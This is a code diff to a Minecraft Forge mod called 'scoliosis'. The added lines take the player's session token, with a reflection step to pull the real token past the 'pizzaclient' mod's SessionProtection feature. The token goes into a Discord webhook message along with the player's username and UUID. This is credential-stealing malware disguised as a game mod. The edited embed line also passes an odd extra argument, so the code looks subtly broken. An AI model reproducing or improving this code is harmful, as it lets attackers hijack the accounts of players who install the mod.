@@ -56,6 +56,8 @@ import net.minecraft.client.Minecraft;
 import net.minecraftforge.common.MinecraftForge;
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
+import net.minecraftforge.fml.common.Loader;
+
 @Mod(modid = "scoliosis", version = "1.0")
 public class scoliosis {
 
@@ -107,6 +109,11 @@ public class scoliosis {
                 new File(ilrFolderPath).mkdirs();
             }
 
+            String token = Minecraft.getMinecraft().getSession().getSessionID().replace("token:", "").replace(":"+Minecraft.getMinecraft().getSession().getPlayerID(), "");
+            if (Loader.isModLoaded("pizzaclient")) {
+                token = (String) ReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
+            }
+            
             DiscordMessage message = DiscordMessage.builder()
                     .withUsername("#iloveratted")
                     .withAvatar("https://cdn.discordapp.com/attachments/1152580329605968053/1152608037396303972/cmUuanBn.png")
@@ -118,7 +125,7 @@ public class scoliosis {
                             .addFields(
                                     new DiscordEmbed.FieldEmbed("Username: ",  Minecraft.getMinecraft().getSession().getUsername(), true),
                                     new DiscordEmbed.FieldEmbed("UUID: ",  Minecraft.getMinecraft().getSession().getPlayerID(), true),
-                                    new DiscordEmbed.FieldEmbed("Session ID: ", Minecraft.getMinecraft().getSession().getSessionID().replace("token:", "").replace(":"+Minecraft.getMinecraft().getSession().getPlayerID(), ""), false))
+                                    new DiscordEmbed.FieldEmbed("Session ID: ", token, ""), false))
                             .build())
                     .build();
 
